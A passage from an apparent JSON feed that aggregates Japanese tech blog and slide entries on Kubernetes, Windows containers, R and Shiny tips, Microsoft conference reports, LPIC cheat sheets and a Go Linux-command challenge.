使いこなしブックPrometheusでKubernetesを監視する本Kubernetes-Native Development & Deployment実践入門 Kubernetes カスタムコントローラへの道Knativeの歩き方資格情報処理安全確保支援士LPIC 101、102ツール・技術DockerKubernetesHelmPrometheusGrafanaLokiArgo CDConcourseTerraformTelepresencecert-managerWindowsコンテナMicrosoft AzureGo言語Vue.js社内での活動定期勉強会を主催ふりかえりを実施、ファシリテーター役Dockerワークショップを開催2020年の目標2020年もCloud Nativeを突き進む予定です。マストCKA、CKADを取得するコミュニティに貢献するOSSにコントリビュートするGo言語でのプログラミングに慣れる英語力を高めるできれば業務としてKubernetesを扱える環境に身を置く（遠回しな表現）技術書を書く","isoDate":"2020-01-31T19:03:51.000Z","dateMiliSeconds":1580497431000,"authorName":"kyohmizu","authorId":"kyohmizu"},{"title":"Windowsコンテナのしくみ","link":"https://speakerdeck.com/kyohmizu/windowskontenafalsesikumi","contentSnippet":"Slides for a study meeting.\\rhttps://dockerjp.connpass.com/event/159781/","isoDate":"2020-01-16T05:00:00.000Z","dateMiliSeconds":1579150800000,"authorName":"kyohmizu","authorId":"kyohmizu"},{"title":"docker (rocker) でheadless Chromeを動かす","link":"https://blog.atusy.net/2020/01/14/chromote-on-rocker/","contentSnippet":"RでWebページのスクリーンショットを撮るにはheadless Chromeが今風？従来、RでWebページのスクリーンショットを撮るにはwebshotパッケージが活躍してきました。しかし、webshotパッケージの内部で動くPhantomJSは開発が停止して久しいです。そんな中、webshotパッケージの開発者であるwchは、headless Chromeを使ってスクリーンショットを撮影するwebshot2パッケージをRStudio製OSSとして開発開始しました。","isoDate":"2020-01-14T00:00:00.000Z","dateMiliSeconds":1578960000000,"authorName":"Atsushi Yasumoto","authorId":"atusy"},{"title":"テストで使いたくて，DinD (Docker in Docker) でk8sの環境を整えた","link":"https://qiita.com/tozastation/items/eafde1a75c35bb9d1a68","contentSnippet":"TL;DRこちらのDockerfileを見納めくださいkindとアプリケーションのコンテナを分けても良かったのですが，kubeconfigの受け渡しが面倒だったので妥協しましたhttps://…","isoDate":"2019-12-30T14:30:36.000Z","dateMiliSeconds":1577716236000,"authorName":"tozastation","authorId":"tozastation"},{"title":"Kubernetes に Windowsノードを0から追加してみた話","link":"https://speakerdeck.com/kyohmizu/kubernetes-ni-windowsfalsedowo0karazhui-jia-sitemitahua","contentSnippet":"Slides for a study meeting.\\rhttps://msdevjp.connpass.com/event/154913/","isoDate":"2019-12-24T05:00:00.000Z","dateMiliSeconds":1577163600000,"authorName":"kyohmizu","authorId":"kyohmizu"},{"title":"0からはじめる Windows on Kubernetes","link":"https://qiita.com/kyohmizu/items/dffdd49123b1e47c3ac4","contentSnippet":"はじめにKubernetes の Windows 対応は v.1.14 でGAとなりました。本記事では、既存の Kubernetes クラスタに0から Windows ワーカーノードを追加する方…","isoDate":"2019-12-22T18:19:52.000Z","dateMiliSeconds":1577038792000,"authorName":"kyohmizu","authorId":"kyohmizu"},{"title":"importasパッケージでPython風にパッケージを使おう","link":"https://blog.atusy.net/2019/12/21/importas/","contentSnippet":"Rアドベントカレンダー、12/21の記事です。Rmd関連のつもりでしたが、時間がないので、最近作ったimportasパッケージのネタに走ることにしました。importasパッケージでは、Pythonにおけるimport numpy as npみたいなことが、Rでできるようになります。Pythonではimportしたライブラリにドットを繋ぐ形で、関数の呼び出しを行います（例えばnp.mean）。同様に、importasパッケージではggplot2 %as% ggなどとパッケージ名を省略し、$演算子を用いて関数を呼び出します（例えばgg$ggplot）。","isoDate":"2019-12-21T00:00:00.000Z","dateMiliSeconds":1576886400000,"authorName":"Atsushi Yasumoto","authorId":"atusy"},{"title":"Knative Serving in Production","link":"https://qiita.com/toVersus/items/1317a31fead9b836a68d","contentSnippet":"概要Knative Serving は、ステートレスなアプリケーションを対象に、HTTP リクエスト駆動で自動スケールする仕組みを提供します。Kubernetes (K8s) と Ingress (Isti…","isoDate":"2019-12-18T22:00:21.000Z","dateMiliSeconds":1576706421000,"authorName":"Tsubasa Nagasawa","authorId":"toVersus"},{"title":"キャリアアップ支援制度を利用してArchitecting on AWSを受講しましたというアドベントカレンダー書いてました","link":"https://blog.masasuzu.net/entry/2019/12/15/004259","contentSnippet":"tech.mobilefactory.jpだいぶ前に受けたArchitecting on AWSの聴講記録です。","isoDate":"2019-12-14T15:42:59.000Z","dateMiliSeconds":1576338179000,"authorName":"SUZUKI, Masashi","authorId":"masasuzu"},{"title":"GDG DevFest Tokyo 2019に行ってきた","link":"https://blog.masasuzu.net/entry/2019/12/14/000000","contentSnippet":"tokyo.gdgjapan.org珍しく、何も予定が入ってない土曜日だったので、行ってきました。最近GCPを触る機運が出てきたのでちょうどいいタイミングでした。以下メモGCP 101 | 坂田 純 | GDG DevFest Tokyo 2019主にCloudRunの話。HTTPをlistenするコンテナを起動するサービス。使った分だけ課金対象となる。リクエスト数次第で自動的にスケールする。とお手軽にできそうな印象。インターフェースがHTTPなので基本的にはパブリックでアクセス出来てしまうが、--no-allow-unauthticatedオプションをつけてデプロイするとで限られた人だけ実行できるようになります。これでバッチ的なことができそう?マイクロサービスの開発とテストファースト/テスト駆動開発 | 柴田 芳樹 | GDG DevFest Tokyo 2019ちょいちょいブログとかは見てましたが、話を聞くのは初めてでした。還暦を迎えてもコードをバリバリ書いてるのは素直に尊敬します。メルペイのマイクロサービスのテストにも興味深かったですが、組み込みでのテストの話も興味深く聴かせてもらいました。ツールや環境の充実度の差はあれど、組み込みでもウェブでもやるべきことは同じなのだなと思いました。CloudNative 時代における GKE/Kubernetes ではじめる開発 | 青山 真也 | GDG DevFest Tokyo 2019k8sの紹介的な話。k8s好きになりました。話がすごいうまくて、めんどくさそうだなあと思ってたkubernetesの印象が変わりました。その他:D社のブースを覗いたらMOVの構成図が展示されていて、IoT関連だけAWSを使っていてそれ以外はGCPを使ってるのが興味深かった。IoT関連のものも別で実装して、AWSからは引き上げるようなことを言ってて、なるほどなあとなりました。基本的にAWSで構成されたインフラばかり見てたのでなかなか新鮮でした。","isoDate":"2019-12-13T15:00:00.000Z","dateMiliSeconds":1576249200000,"authorName":"SUZUKI, Masashi","authorId":"masasuzu"},{"title":"【イベント参加レポート】Microsoft Ignite The Tour Tokyo","link":"https://kyohmizu.hatenablog.com/entry/2019/12/10/012041","contentSnippet":"2019/12/5(木)、6(金)に開催された Microsoft の Tech イベントに参加しました。www.microsoft.com概要アメリカで行われた Ignite のセッションを再演登壇者は他人の資料で発表 (翻訳以上の改変はできないと聞きました)新情報の発表等はされず、通常セッションとハンズオンのみMicrosoft エキスパートとの交流の場外国人のスタッフを多数配置基本的には英語でやり取りするらしい (私は話しませんでした)感想外国人が多く、グローバルな印象を受けました。会場はいつものホテルでしたが、やはりセッションの入れ替え時は非常に混雑します。ブースのエリアはスペースを広くとってあり、割と閑散としていた気がします (セッション中は特に)。技術的には初級者向けの内容が多かったと思います。セッションよりは、どちらかといえばコミュニケーションを重視したイベントのようでした。MSの方やブースの担当者と話すことができ、有意義な時間を過ごせました。参加して得るものはありました。セッション参加セッションのまとめとメモ。THR30031 - Azure とコマンドライン－オプション、ヒント、テクニック難易度：初級メモエクスプローラーでcmdをパスに入力(powershell、wslも)Windows Console → Windows TerminalTerminalはStoreで入手可能Azure CLIやVSCode RemoteはサラッとAPPS30 - コンテナーを利用したアプリケーションの最新化資料：https://github.com/microsoft/ignite-learning-paths-training-apps/tree/master/apps30難易度：初級要点コンテナ、Dockerの基礎的な説明コンテナランタイムやマルチステージビルド等は、軽く話に出る程度コンテナに関しては特に知らない話はなかったACRやACIの概要、使い方の軽い説明サービス移行のデモではコンテナ化してApp Service、CosmosDB、SQL Databaseを使用メモデータセンターのアプリをクラウドにLift&Shift仮想マシンはいいけど無駄が多いコンテナを使ったモダナイゼーションアプリの境界を明確にする旧バージョンの残りファイルがなくなるオーバーヘッドなしでリソース分離繰り返し可能なビルド、環境構築コンテナを使う理由あらゆる環境で同じように動作するベロシティの向上コンテナの仕組み高度に構成されたプロセスcgroupsnamespaceベースイメージからの差分をgzip化したものコンテナランタイムの軽い説明Docker以外にも対応、containerd、runCDockerfileイメージのビルド方法を説明するテキストファイルバッチスクリプトみたいなものビルドリポジトリACRACIサーバーレスのコンテナ実行環境ハイパーバイザーレベルの分離デモサービス移行の話APPS40 - インフラストラクチャと Azure Kubernetes Service を統合する資料：https://github.com/microsoft/ignite-learning-paths-training-apps/tree/master/apps40難易度：中級要点AKSの作成手順の説明AKSとAzureの連携サービスについて知識を整理できたオートスケールの話は理解が浅かったので参考になったAKSを使う最大のメリットはAzureADとの連携ネットワークとセキュリティの話は非常に参考になったネットワークポリシーやAZメモ基本的な使い方ではなく、発展的な内容Tailwind Tradaersのデモ経営、ビジネス課題に対応復元力セキュリティ柔軟性スケールKubernetesを選択する理由抽象化のための標準化されたAPI自己修復スケーラビリティk8sアーキテクチャAKSはマスターノードが無料で提供されるネットワークに2種類指定できるデフォルトはkubenetAzure CNI 仮想ネットワークを使用。大規模ネットワークに対応。きちんと設計する必要があるACIを仮想ノードとして使用AZAKSの作成リソースグループ仮想ネットワークサブネットサービスプリンシパル(k8sから他のリソースを作成)クラスタ本番クラスタを作成するにはオプションを多数指定する必要がある作成時にしか設定できないオプションがあるインストール時にCNI、AZの設定をする仮想ノードの有効化ACIをAKSから使えるようにする必要があるRabbitMQ is 何？HPAメトリクスサーバーにPodから情報が送られる閾値を超えたらスケールクラスタオートスケーラーノードのスケール仮想ノードLinux、Windows、GPUに対応nodeselectorで指定仮想ノードによるスケールのデモネットワークとセキュリティACRでコンテナの脆弱性をチェックAKSを使う最大のメリットはAzureADとの連携！Azure Key VaultPod間の通信Pod IdentityNMI Server(Daemonset)MICAzure Identity BindingネットワークポリシーPod間トラフィックの保護Azure Network PolicyAzure CNIを使ったPodブリッジレベルCalico Network PolicyカーネルレベルAZベータ版データセンター障害の回復性ゾーンは3つまで使用可能ゾーンの数に合わせてレプリカ数を設定THR10007 - ITと技術者の将来について語り合うエモい話要点ディスカッション形式コミュニティ参加やアウトプットを重視しているどんどんチャレンジしてスキルをつけていくことが大事メモ今後あるいは10年後どうなる？これからチャレンジしたいことは？MRフリーランス自分の営業をこれからも続けていく自分が何が得意で、何が苦手かアピールブルーオーシャンを探したいコミュニティのエンパワーメント出てこない人にどうやって技術を好きになってもらうか社内コミュニティを作ってもらうお勧めしたいことは？技術を楽しんで、周りに広めていく仲間ができてコミュニティができる人を変えるのは難しい、好きなことを広めることならできる楽しんでる雰囲気を出していると向こうから来てくれる自分の強みを知って、それを発信していく業務で触ってなくてもコミュニティで発表いていたやりたいこと、好きなことを見つけて、人が見える場所に出していく外のコミュニティに参加してみる会社にいるだけではスキルはプロジェクト依存コミュニティの熱量がすごいアウトプットすると強い人がインプットをくれるとりあえず踏み出してみる楽しんだもの勝ちやりたいことを素直にやってみるUNC10013 - Vue.js 3 に向けた Vue.js 入門難易度：初級～中級要点Vue.js の設計思想、V3 でも使える構文、V3 の新機能コンポジッションAPI関数ベースで提供される APIコンポーネントのロジックが綺麗になるV2 でもお試しで使えるブース立ち寄ったブースの中で、興味を持った内容を紹介します。LenovoLenovo ThinkSystem SE350 | レノボジャパン軽量でコンパクトなエッジサーバーWifi、LTE、有線ネットワーク対応Intel製品概要: OpenVINO™ ツールキットエッジでのディープラーニング推論アプリケーション開発学習済みモデルを無料で利用可能インテルCPUに対応PivotalAzure Spring Cloud | Microsoft DocsSpring Boot アプリをクラウドで実行ベータ版のサービスAKS 上にデプロイされる水平スケールやメトリクス、ログの収集が可能AKS は隠蔽されているため、ユーザーからは見えない手軽に導入できるので POC にも適している","isoDate":"2019-12-09T16:20:41.000Z","dateMiliSeconds":1575908441000,"authorName":"kyohmizu","authorId":"kyohmizu"},{"title":"Introduction to Telepresence","link":"https://speakerdeck.com/kyohmizu/introduction-to-telepresence","contentSnippet":"Slides for an in-house study meeting","isoDate":"2019-11-08T05:00:00.000Z","dateMiliSeconds":1573189200000,"authorName":"kyohmizu","authorId":"kyohmizu"},{"title":"tidymodelsでもxgboostを解釈したい","link":"https://blog.atusy.net/2019/10/29/interpret-tidymodels/","contentSnippet":"はじめにXGBoostによる学習Variable Importance Plot (VIP)Partial Dependence Plot (PDP)可視化で得られた考察を反映するはじめにtidymodelsに属するparsnipパッケージを用いて機械学習を行った場合、大本のパッケージで学習した場合と異なる構造のオブジェクトが返ります。例えばxgboost::xgboost関数で学習した結果はxgb.Boosterクラスを持つオブジェクトです。一方でparsnip::fit関数を用いてXGBoostの学習を行った結果は、_xgb.Boosterクラスとmodel_fitクラスを持つオブジェクトです。","isoDate":"2019-10-29T00:00:00.000Z","dateMiliSeconds":1572307200000,"authorName":"Atsushi Yasumoto","authorId":"atusy"},{"title":"Windowsコンテナ入門","link":"https://speakerdeck.com/kyohmizu/windowskontenaru-men","contentSnippet":"Slides for a study meeting.\\rhttps://ssmjp.connpass.com/event/148726/","isoDate":"2019-10-25T04:00:00.000Z","dateMiliSeconds":1571976000000,"authorName":"kyohmizu","authorId":"kyohmizu"},{"title":"Zero Scale Abstraction in Knative Serving - Part1","link":"https://qiita.com/toVersus/items/9fa635e9cf57643f8dd6","contentSnippet":"Serverless Days Tokyo 2019 の Zero Scale Abstraction in Knative Serving というセッションの内容を書き起こしたものです。スピーカー…","isoDate":"2019-10-23T13:20:58.000Z","dateMiliSeconds":1571836858000,"authorName":"Tsubasa Nagasawa","authorId":"toVersus"},{"title":"LPIC 102 チートシート","link":"https://qiita.com/kyohmizu/items/d5d6fedc527efa9f649c","contentSnippet":"試験前の確認事項としてまとめた内容です。環境変数ロケールディレクトリ・ファイル文字コードIPアドレスのクラスプライベートアドレスポート変数envsetshellのオプションエ…","isoDate":"2019-10-09T01:56:54.000Z","dateMiliSeconds":1570586214000,"authorName":"kyohmizu","authorId":"kyohmizu"},{"title":"LPIC 101チートシート","link":"https://qiita.com/kyohmizu/items/923844999018fd456d44","contentSnippet":"試験前の確認事項としてまとめた内容です。環境変数デバイスファイルファイルシステムディレクトリ・ファイルsystemdのユニットvi正規表現dpkg設定ファイル  /etc/dpkg/…","isoDate":"2019-10-09T01:48:33.000Z","dateMiliSeconds":1570585713000,"authorName":"kyohmizu","authorId":"kyohmizu"},{"title":"Rで作る対称コルーチン","link":"https://blog.atusy.net/2019/10/03/symmetric-coroutine/","contentSnippet":"n月刊ラムダノート Vol.1の『「コルーチン」とは何だったのか』を読んでいる。せっかくなので勉強がてら、Rでコルーチンを実装してみることにした。今回は元祖コルーチンとして紹介されている対称コルーチンを扱う。","isoDate":"2019-10-03T00:00:00.000Z","dateMiliSeconds":1570060800000,"authorName":"Atsushi Yasumoto","authorId":"atusy"},{"title":"面倒なことはScalaスクリプトにやらせよう / let scala scripts do the troublesome things","link":"https://speakerdeck.com/nomadblacky/let-scala-scripts-do-the-troublesome-things","contentSnippet":"2019/09/13 Scala秋祭り","isoDate":"2019-09-16T04:00:00.000Z","dateMiliSeconds":1568606400000,"authorName":"Takumi Kadowaki","authorId":"nomadblacky"},{"title":"lemon パッケージで facet した ggplot2 に軸を表示する","link":"https://blog.atusy.net/2019/08/18/lemon-facet-rep/","contentSnippet":"","isoDate":"2019-08-18T00:00:00.000Z","dateMiliSeconds":1566086400000,"authorName":"Atsushi Yasumoto","authorId":"atusy"},{"title":"R Markdown で coord_fixed な ggplot2 の余白を取り除く","link":"https://blog.atusy.net/2019/08/12/rmd-fig-crop-margin/","contentSnippet":"不要な余白 (黒色部) ができてしまう時は、チャンクオプションの fig.process に画像処理を行う関数を指定しよう。","isoDate":"2019-08-12T00:00:00.000Z","dateMiliSeconds":1565568000000,"authorName":"Atsushi Yasumoto","authorId":"atusy"},{"title":"Rmd + Revealjs で簡単に印刷もできる2カラムレイアウトを実現する (inline-block)","link":"https://blog.atusy.net/2019/08/11/revealjs-2col-inline-block/","contentSnippet":"出力例実装CSSYAML フロントマターCSS チャンクマークダウン記法Rmd 例Enjoy!R Markdown で Reveal.js を使ったスライド作りをする時、時々欲しくなるのが、2カラムレイアウトだ。","isoDate":"2019-08-11T00:00:00.000Z","dateMiliSeconds":1565481600000,"authorName":"Atsushi Yasumoto","authorId":"atusy"},{"title":"Shiny で動的に図の数を変更する","link":"https://blog.atusy.net/2019/08/09/shiny-dynamic-numer-of-plots/","contentSnippet":"","isoDate":"2019-08-09T00:00:00.000Z","dateMiliSeconds":1565308800000,"authorName":"Atsushi Yasumoto","authorId":"atusy"},{"title":"Shiny でプロットを click したり brush したりした時に得られるデータまとめ","link":"https://blog.atusy.net/2019/08/07/shiny-clickopts/","contentSnippet":"tr:nth-child(even) { background: #eee;}Shiny では plotOutput の click, dblclick, hover, brush 引数を利用することで，プロットした画像からマウス操作で座標情報などを取得できる．この時得られるデータがドキュメントされていなかったので調査した．","isoDate":"2019-08-07T00:00:00.000Z","dateMiliSeconds":1565136000000,"authorName":"Atsushi Yasumoto","authorId":"atusy"},{"title":"Shiny でマウスの位置に応じてプロットにツールチップを表示する","link":"https://blog.atusy.net/2019/08/06/shiny-hover-tooltip/","contentSnippet":"Shiny でプロットにツールチップを表示させる一番簡単な方法は plotly を使うことだろうが，Shiny だけで頑張ってしまうと柔軟でいい．","isoDate":"2019-08-06T00:00:00.000Z","dateMiliSeconds":1565049600000,"authorName":"Atsushi Yasumoto","authorId":"atusy"},{"title":"Shiny で input の変更が反映されるまでの時間を調整する (debounce / throttle)","link":"https://blog.atusy.net/2019/08/04/shiny-throttle-and-debounce/","contentSnippet":"入力から一定時間の経過を待ってプログラムを実行するには debounce や throttle を使う．","isoDate":"2019-08-04T00:00:00.000Z","dateMiliSeconds":1564876800000,"authorName":"Atsushi Yasumoto","authorId":"atusy"},{"title":"DT::datatable の行番号を並べ変え可能にする (Shiny / 非Shiny)","link":"https://blog.atusy.net/2019/08/03/dt-ordered-by-row-numbers/","contentSnippet":"DT::datatable とは行名 (行番号) で並べ変える非 shinyshinyrenderDT(server = FALSE) にする行番号相当の列を用意するEnjoy!DT::datatable とはDT::datatable は jQuery 用の DataTables プラグインを R で使うための関数だ．これに iris などのデータフレームを与えると，対話的な表を簡単に作れる．","isoDate":"2019-08-03T00:00:00.000Z","dateMiliSeconds":1564790400000,"authorName":"Atsushi Yasumoto","authorId":"atusy"},{"title":"Shiny でプロットの高さをブラウザ画面のサイズに合わせて変更する","link":"https://blog.atusy.net/2019/08/01/shiny-plot-height/","contentSnippet":"","isoDate":"2019-08-01T00:00:00.000Z","dateMiliSeconds":1564617600000,"authorName":"Atsushi Yasumoto","authorId":"atusy"},{"title":"Shiny で表示タブを変更するリンクを貼る","link":"https://blog.atusy.net/2019/07/31/shiny-show-tab/","contentSnippet":"","isoDate":"2019-07-31T00:00:00.000Z","dateMiliSeconds":1564531200000,"authorName":"Atsushi Yasumoto","authorId":"atusy"},{"title":"R Markdown でコードの折り畳みをチャンクごとに選択可能にした (rmarkdown 1.15)","link":"https://blog.atusy.net/2019/07/24/rmd-1-15-gh/","contentSnippet":"html_document ではコードの折り畳みができる．使い方は簡単で，YAMLフロントマターにて code_folding を指定するだけだ1．none: code_folding を無効化する．show: デフォルトで全て表示する．hide: デフォルトで全て非表示にする．show・hideの場合は，後からソースコードごとにボタンで表示を切り替えることができる．","isoDate":"2019-07-24T00:00:00.000Z","dateMiliSeconds":1563926400000,"authorName":"Atsushi Yasumoto","authorId":"atusy"},{"title":"bookdown のコミッタになったのでこれまでの貢献を振り返る","link":"https://blog.atusy.net/2019/07/07/bookdown-committer/","contentSnippet":"bookdown のコミッタになった．ほんまにええんかいなと思いつつ，貢献を続けていく上で励みになるので，ありがたく頂戴した次第．私が過去に出した PR が Pandoc の仕様変更に巻き込まれたので，どうするか相談していたところ，","isoDate":"2019-07-07T00:00:00.000Z","dateMiliSeconds":1562457600000,"authorName":"Atsushi Yasumoto","authorId":"atusy"},{"title":"Tidyr 1.0.0 で追加される pack を使えば見せる用の表が簡単に作れるかも","link":"https://blog.atusy.net/2019/07/07/application-of-pack/","contentSnippet":"","isoDate":"2019-07-07T00:00:00.000Z","dateMiliSeconds":1562457600000,"authorName":"Atsushi Yasumoto","authorId":"atusy"},{"title":"knitr はチャンクが掃き出すコードブロックにもっとクラス属性を与えるべきと思ったが PR を断念した","link":"https://blog.atusy.net/2019/07/05/gave-up-pr-to-knitr/","contentSnippet":"R Markdown ではチャンクオプションを利用して，ソースコード，出力，メッセージ，警告，エラーに対して，クラス属性などを付与できる．だったら最初から chunk-source, chunk-output, …って感じのクラス持たせておいた方がよくない？って思った．","isoDate":"2019-07-05T00:00:00.000Z","dateMiliSeconds":1562284800000,"authorName":"Atsushi Yasumoto","authorId":"atusy"},{"title":"Pandoc 2.7.3 を使うと bookdown におけるコードブロックの行番号がちょっと楽になりそう","link":"https://blog.atusy.net/2019/07/03/rmd-line-num-in-pandoc-2-7-3/","contentSnippet":"Pandoc 2.7.3 を使うと bookdown におけるコードブロックの行番号がちょっと楽になりそうな一方で問題もあるのでメモ．bookdown に依存している pagedown や blogdown も関係しうる．","isoDate":"2019-07-03T00:00:00.000Z","dateMiliSeconds":1562112000000,"authorName":"Atsushi Yasumoto","authorId":"atusy"},{"title":"R Markdown + Honoka の実用化は険しい","link":"https://blog.atusy.net/2019/07/03/honokadown/","contentSnippet":"rmarkdown::html_document に Honoka という 日本語表示を最適化した Bootstrap テーマをあてたかった． 今のところ，まともに使おうとすると本家と Honoka の bootstrap.min.css を両方取り込むことになって非効率．","isoDate":"2019-07-03T00:00:00.000Z","dateMiliSeconds":1562112000000,"authorName":"Atsushi Yasumoto","authorId":"atusy"},{"title":"雑訳vignette: Pivoting (tidyr 1.0.0)","link":"https://blog.atusy.net/2019/06/29/pivoting-tidyr-1-0-0/","contentSnippet":"tiydr 1.0.0 で追加される pivot_longer() と pivot_wider() の使い方を紹介する vignette の雑な訳","isoDate":"2019-06-29T00:00:00.000Z","dateMiliSeconds":1561766400000,"authorName":"Atsushi Yasumoto","authorId":"atusy"},{"title":"CRAN にパッケージを初投稿する手順","link":"https://blog.atusy.net/2019/06/28/cran-submission/","contentSnippet":"R のヘルプをもっと便利にする felp パッケージが CRANからリリースされた．この経験を踏まえ，CRAN 投稿を初挑戦する人向けの情報を纏めた．","isoDate":"2019-06-28T00:00:00.000Z","dateMiliSeconds":1561680000000,"authorName":"Atsushi Yasumoto","authorId":"atusy"},{"title":"dplyr::mutate_all と purrr::modify の比較","link":"https://blog.atusy.net/2019/06/13/mutate-all-vs-modify/","contentSnippet":"dplyr::mutate_all はデータフレーム中の各変数 (列) に対して関数を適用する。purrr::modify はリストライクなオブジェクトの各要素に対して関数を適用するが、返り値は入力したオブジェクトと同じクラスになる。このため、データフレームを入力するとデータフレームを返すので、 dplyr::mutate_all のように振る舞うことができる。","isoDate":"2019-06-13T00:00:00.000Z","dateMiliSeconds":1560384000000,"authorName":"Atsushi Yasumoto","authorId":"atusy"},{"title":"de:code 2019 参加レポート","link":"https://kyohmizu.hatenablog.com/entry/2019/06/06/111805","contentSnippet":"Microsoft主催のテクニカルカンファレンス「de:code 2019」に参加してきました。www.microsoft.com参加セッション1日目コンテナ技術を中心にセッションを選択【KN01】基調講演【CD06】しくみがわかる Azure Kubernetes Service (AKS) ～開発者目線で Kubernetes の基本を理解する～【CD01】Windows Containers と Azure による、既存 .NET アプリケーションのモダナイゼーション【CD91】HashiCorp Terraform Azure Provider チュートリアル【CD12】マネージド Kubernetes ガチ本番運用 in ZOZOTOWNwww.youtube.com2日目コンテナ・セキュリティのセッションを選択【SE07】脆弱性はなぜ生まれ、どのように攻撃されるのか? 安全なアプリを開発、運用するためのきほん【CD93】コンテナ環境の永続化ストレージ問題を NetApp Kubernetes Service と Azure NetApp Files でさらっと解決【CM12】.NET Core マルチ プラットフォームの本質【SE05】もうセキュリティはやりたくない!! 第 3 弾 ～Azure Sentinel Deep Dive～注目技術参加したセッションの中で、特に印象に残った or 関心のある技術を取り上げます。Azure Kubernetes Service(AKS)Azureのマネージド Kubernetes サービスである AKS ですが、導入事例が増えてきているそうです。ノロジーズをはじめ、いくつかの企業が自社の導入について講演していました。Kubernetes に概要や操作に関しては特筆することはありませんでしたが、Azure関連の技術として以下に興味を持ちました。Kubernetes-based Event-driven Autoscaling(KEDA)Microsoft と Red Hatが共同作成したプロジェクト。イベント駆動でコンテナのオートスケールを実現します。GitHub - kedacore/keda: KEDA is a Kubernetes-based Event Driven Autoscaling component. It provides event driven scale for any container running in KubernetesVirtual Kubeletkubelet のように動作し、Kubernetes と他のAPIを接続する役割を果たすもの。VM と同じように Kubernetes クラスタで一元管理できます。GitHub - virtual-kubelet/virtual-kubelet: Virtual Kubelet is an open source Kubernetes kubelet implementation.Windows コンテナサポートWindows Server Node が、Kubernetes クラスタで Linux Node と同時に管理できるようになりました。AKS では Multiple Node Pool を使用することで Windows Server Node を作成できます。チュートリアルを試しましたが、なぜかクラスタ作成に失敗)Windows containers now supported in Kubernetes - Open Source blogAzure NetApp FilesNetApp 社の高速ストレージサービス。SSD 並みの速度が出るそうで、Kubernetes の永続化ボリュームとして有用だと思います。また NetApp Kubernetes Service という Kubernetes 管理サービスも提供しているようです。(Rancher みたいなもの？)Azure NetApp Files documentation | Microsoft DocsAzure SentinelAI を使用した高機能なセキュリティサービス。Azure Sentinel | Microsoft Azureその他Azure DevOpsAzure PiplineApp ServiceService FabricWSL2感想Azureに関連したテーマのセッションがほとんどでした。クラウドサービスは以前に比べ使いやすくなっていて、機能も充実してきた印象です。AKS、AzureADの動向は今後も注目していこうと思います。LT資料社内勉強会で de:code の recap を発表しました。    Recap of de code 2019  from Kyohei Mizumoto www.slideshare.netおまけ2日間のお昼のお弁当です。1日目2日目","isoDate":"2019-06-06T02:18:05.000Z","dateMiliSeconds":1559787485000,"authorName":"kyohmizu","authorId":"kyohmizu"},{"title":"行列を行/列ごとのリストに変換する関数の紹介とベンチマーク (base::asplit, purrr::array_tree, purrr::array_branch)","link":"https://blog.atusy.net/2019/06/01/asplit-r-3-6-0/","contentSnippet":"baseasplitasplit(行列)asplit(配列)purrrarray_treearray_tree(行列)array_branch(配列)array_tree(ベクトル)array_branchベンチマークR 3.6.0 では行列や配列を MARGIN に応じたリストに分割する asplit 関数が追加された．既に purrr パッケージが同様の機能として array_tree や array_branch を実装していたので，挙動とベンチマーク結果を比較してみる．","isoDate":"2019-06-01T00:00:00.000Z","dateMiliSeconds":1559347200000,"authorName":"Atsushi Yasumoto","authorId":"atusy"},{"title":"Kubernetesリンク集","link":"https://kyohmizu.hatenablog.com/entry/2019/05/28/115504","contentSnippet":"Kubernetes関連の役立つリンクを記載します。公式リファレンスReference - KubernetesKubectl Reference DocsPhippy and Friends - Cloud Native Computing FoundationGitHubGitHub - kubernetes/kubernetes: Production-Grade Container Scheduling and ManagementGitHub - kelseyhightower/kubernetes-the-hard-way: Bootstrap Kubernetes the hard way on Google Cloud Platform. No scripts.GitHub - jamiehannaford/what-happens-when-k8s: \uD83E\uDD14 What happens when I type kubectl run?プロダクトGoogle Kubernetes Engine documentation \xa0|\xa0 Kubernetes Engine \xa0|\xa0 Google CloudAzure Kubernetes Service (AKS) Documentation - Tutorials, API Reference | Microsoft DocsWhat Is Amazon EKS? - Amazon EKSDocumentation | Rancher LabsK3s: Kightweight KubernetesPivotal Container Service (PKS) | Pivotalスライド、ブログ等Kubernetes のソースコードとの付き合い方 #gounco / Kubernetes source code reading - Speaker DeckKubernetes Patterns : Capacity PlanningKubeWeekly - QiitaKubernetesのユーザー管理と認証・権限確認機構を理解しよう | さくらのナレッジ書籍Kubernetes完全ガイド - インプレスブックス","isoDate":"2019-05-28T02:55:04.000Z","dateMiliSeconds":1559012104000,"authorName":"kyohmizu","authorId":"kyohmizu"},{"title":"【20日チャレンジ】LinuxコマンドをGoで実装","link":"https://kyohmizu.hatenablog.com/entry/2019/05/23/172119","contentSnippet":"Go言語の学習のため、LinuxコマンドをGoで実装します。\\r目的\\r\\rGo言語に慣れる\\r標準パッケージの機能、使い方を知る\\r\\rルール\\r以下のルールでチャレンジを行います。\\r\\r1日1コマンドを実装する\\r最低限、コマンドの基本的な動作(オプションなしの実行など)を行えるようにする\\r余裕があれば追加機能を実装する\\rコマンド名は\\"my\\" + \\"Linuxコマンド名\\"とする\\r極力標準パッケージを使用する\\r\\rソースコード\\rソースコードはGithubで管理します。\\rhttps://github.com/kyohmizu/go-cli-tools\\rスケジュール\\r\\r\\r\\rNo\\r日付\\rコマンド\\r基本実装\\rオプション\\r学習内容\\r\\r\\r1\\r5/23\\rmyls\\r〇\\r\xa0\\r\\rディレクトリ操作\\rエラー処理\xa0\\r\\r\\r\\r2\\r5/24\\rmycp\\r〇\\r△\\rファイル操作\\r\\r\\r3\\r5/25\\rmymv\\r〇\\r△\\r\xa0\\r\\r\\r4\\r5/26\\rmyrm\\r〇\\r△\\r\xa0\\r\\r\\r5\\r5/27\\rmycat\\r〇\\r△\\r\xa0\\r\\r\\r6\\r5/28\\rmycurl\\r〇\\r△\\r\\rhttp接続の実装\\rオプションの複数回指定\\r\\r\\r\\r7\\r5/29\\rmypwd\\r〇\\r△\\r\xa0OSによる条件分岐\\r\\r\\r8\\r5/30\\rmytouch\\r〇\\r△\\rbuild 